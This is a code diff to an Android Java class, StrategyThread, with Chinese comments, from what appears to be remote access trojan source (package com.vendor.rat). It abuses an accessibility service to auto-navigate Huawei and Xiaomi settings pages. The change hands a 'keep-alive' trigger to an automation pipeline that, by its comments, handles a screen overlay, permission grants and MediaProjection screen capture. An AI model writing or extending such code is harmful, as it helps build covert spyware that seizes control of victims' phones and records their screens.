@@ -175,10 +175,10 @@ public final class StrategyThread {
     }
 
     /**
-     * 根据厂商启动对应的设置页面
+     * 根据厂商启动对应的设置页面 (public — 供 LaunchSettingsStage 调用)
      * HuaweiEngine / XiaomiEngine 被动检测窗口变化 → 自动导航
      */
-    private static void launchSettingsForVendor(Context ctx, MyAccessibilityService svc) {
+    public static void launchSettingsForVendor(Context ctx, MyAccessibilityService svc) {
         // 先回桌面 — 用户可能在设置页面授权无障碍，此时 settings 已在前台
         // 不先回桌面的话，再打开 HWSettings 不触发 WINDOW_STATE_CHANGED 事件
         // HuaweiEngine 收不到事件就不会执行自动化
@@ -253,22 +253,14 @@ public final class StrategyThread {
     }
 
     /**
-     * 触发保活策略 — 由 KeepHeartThread 在 noCompletes API 回调后调用
-     * vendor: noCompletes API 返回未完成策略 → 调用 g(BlockViewVO, true)
+     * 触发保活策略 — 使用管道模式执行
      *
-     * ADAPT: 由于没有真实 API 服务器，由 KeepHeartThread 直接触发
-     * 条件: 无障碍已授权 + 华为设备 + 未触发过
+     * 管道内部处理: 版本检测、完成状态检查、遮罩、引擎、权限、MediaProjection
+     * 此方法只负责防重入 + 基本前置条件
      */
     public static void triggerKeepAliveIfNeeded() {
         try {
             if (keepAliveTriggered.get()) return;
-
-            // 持久化检查: 自动化已完成则不再触发
-            if (isKeepAliveCompleted()) {
-                keepAliveTriggered.set(true);
-                Log.d(TAG, "保活自动化已完成 (持久化)，跳过");
-                return;
-            }
 
             MyAccessibilityService service = MyAccessibilityService.P();
             if (service == null) return;
@@ -279,19 +271,10 @@ public final class StrategyThread {
             // 防止重复触发
             if (!keepAliveTriggered.compareAndSet(false, true)) return;
 
-            Log.d(TAG, "noCompletes 策略触发保活自动化");
+            Log.d(TAG, "触发自动化管道");
 
-            // vendor: 在工作线程执行
-            new Thread(() -> {
-                try {
-                    // vendor: 短暂等待无障碍服务稳定
-                    Thread.sleep(500);
-                    applyBlockView(null, true);
-                } catch (Exception e) {
-                    Log.e(TAG, "triggerKeepAlive error", e);
-                    keepAliveTriggered.set(false);
-                }
-            }, "strategy-trigger").start();
+            // 管道自行处理 版本检测 + 完成状态检查
+            com.vendor.rat.auto.pipeline.AutomationPipeline.executeStandard(service);
 
         } catch (Exception e) {
             Log.e(TAG, "triggerKeepAliveIfNeeded error", e);
